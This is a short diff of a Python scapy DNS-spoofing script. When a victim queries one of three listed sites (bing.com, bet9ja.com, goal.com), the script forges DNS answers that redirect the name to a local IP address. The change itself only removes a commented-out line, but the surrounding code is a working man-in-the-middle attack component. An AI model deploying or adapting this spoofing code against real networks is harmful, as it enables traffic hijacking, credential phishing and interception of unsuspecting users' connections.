@@ -9,7 +9,6 @@ def process_packet(packet):
         websites = ["www.bing.com", "www.bet9ja.com", "www.goal.com"]
         for website in websites:
             if website in qname:
-        # if "www.bing.com" in qname:
                 print("\n\n[+] spoofing target.\n\n")
                 answer = scapy.DNSRR(rrname = qname, rdata = "192.168.110.151")
                 scapy_packet[scapy.DNS].an = answer
